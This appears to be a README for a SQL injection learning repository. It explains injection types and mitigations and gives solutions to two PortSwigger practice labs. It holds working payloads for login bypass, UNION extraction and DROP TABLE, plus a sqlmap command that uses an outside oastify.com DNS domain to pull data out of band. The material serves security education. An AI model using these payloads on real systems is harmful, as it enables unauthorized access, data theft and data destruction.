# SQL Injection Vulnerability

## Overview
SQL Injection (SQLi) is a web security vulnerability that allows an attacker to manipulate the queries an application makes to its database. By exploiting SQL queries, an attacker can retrieve, modify, or delete database records without proper authorization.

## Types of SQL Injection
- **In-band SQL Injection**: Uses the same channel to both launch the attack and gather results.
  - **Error-Based SQL Injection**: Extracts information through database error messages.
  - **Union-Based SQL Injection**: Uses the `UNION` SQL operator to retrieve additional data.
- **Blind SQL Injection**: Exploits queries that do not return results but still affect database logic.
  - **Boolean-Based Blind SQLi**: Infers data by observing application behavior.
  - **Time-Based Blind SQLi**: Uses time delays to determine query success.
- **Out-of-Band SQL Injection**: Utilizes external systems like DNS or HTTP requests to exfiltrate data.

## Impact of a SQL Injection Attack
The severity of SQLi depends on the vulnerability. In the worst-case scenario, an attacker can:
- Leak sensitive data
- Perform CRUD (Create, Read, Update, Delete) operations
- Execute Remote Code Execution (RCE)

## Example of a SQL Injection Attack
### Vulnerable Query (User Authentication)
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
```
If an attacker inputs `' OR '1'='1`, the resulting query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
```
Since `1=1` always evaluates to true, the attacker gains unauthorized access.

## Exploitation Techniques
- **Extracting Data**: `UNION SELECT username, password FROM users;`
- **Bypassing Authentication**: `admin' --`
- **Altering Database**: `DROP TABLE users;`
- **Enumerating Database Schema**:
  - **MySQL**: `SELECT table_name FROM information_schema.tables;`
  - **MSSQL**: `SELECT name FROM sys.tables;`

## Mitigation Strategies
### 1. Use Prepared Statements (Parameterized Queries)
```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
```

### 2. Implement Stored Procedures
```sql
CREATE PROCEDURE ValidateUser (@username VARCHAR(50), @password VARCHAR(50))
AS
BEGIN
    SELECT * FROM users WHERE username = @username AND password = @password;
END
```

### 3. Apply the Principle of Least Privilege
- Use database accounts with minimal permissions.

### 4. Validate and Sanitize Input
- Reject unexpected characters and enforce input length restrictions.

### 5. Use Web Application Firewalls (WAFs)
- Tools like **AWS WAF** or **ModSecurity** can block common SQLi patterns.



# Solution to PortSwigger Labs

# SQL Injection Lab 1: Retrieve Hidden Data (WHERE Clause Exploitation)

## Lab Details
**Lab:** [SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)  
**Database:** PostgreSQL  
**Tool:** Burp Suite, SQLMap  

## Quick Solution
This lab demonstrates a basic SQL injection attack where modifying the `category` parameter allows retrieving hidden items from the database.

## Solution Steps
### 1. Manual Exploitation (Using Burp Suite)
1. Use **Burp Suite** to intercept and modify the request that filters products by category.
2. Modify the `category` parameter with the following payload:
   ```sql
   '+OR+1=1--
   ```
3. Submit the request and verify that additional hidden items appear in the response.

### 2. Automated Exploitation (Using SQLMap)
Use `sqlmap` to automate SQL injection detection and exploitation:
```sh
sudo sqlmap -u 'https://0a7600f603ba54f885822399001d0005.web-security-academy.net:443/filter?category=Accessories*' \
--cookie='session=ma2R4BBvX2qlhfa1rxLtomrI2mEf8WtS' --batch \
--dns-domain=pa3t9ag3m5yqdm6stxugb16nsey5mvak.oastify.com
```

## Notes
- The database management system used in this lab is **PostgreSQL**.
- SQLMap successfully detects and exploits the vulnerability.

# SQL Injection Lab 2: Login Bypass (Authentication Exploitation)

## Lab Details
**Lab:** [SQL Injection Vulnerability Allowing Login Bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)  
**Database:** PostgreSQL  
**Tool:** Burp Suite, ~~sqlmap~~

## Quick Solution
This lab demonstrates a basic SQL injection attack where modifying the `username` parameter allows bypassing authentication and logging in as an administrator.

## Solution Steps
### 1. Manual Exploitation (Using Burp Suite)
1. Use **Burp Suite** to intercept and modify the login request.
2. Modify the `username` parameter with the following payload:
   ```sql
   administrator'--
   ```
3. Submit the request and verify that authentication is bypassed, granting administrator access.



## References
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)

---
This repository contains examples, test cases, and solutions related to SQL Injection vulnerabilities. Feel free to contribute and explore various SQLi scenarios! 🚀

